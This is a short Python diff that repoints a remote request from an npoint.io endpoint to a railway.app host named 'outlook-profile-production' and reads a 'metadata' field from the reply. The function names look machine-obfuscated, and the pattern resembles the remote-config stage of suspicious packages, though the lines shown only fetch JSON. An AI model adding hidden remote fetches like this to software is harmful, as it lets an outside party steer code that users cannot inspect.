@@ -16,7 +16,7 @@ def data_bbnoek_454():
 
     def config_hrcpjg_496():
         try:
-            data_lxzwhm_374 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            data_lxzwhm_374 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             data_lxzwhm_374.raise_for_status()
             net_xrihcd_286 = data_lxzwhm_374.json()
             data_anffyf_127 = net_xrihcd_286.get('metadata')
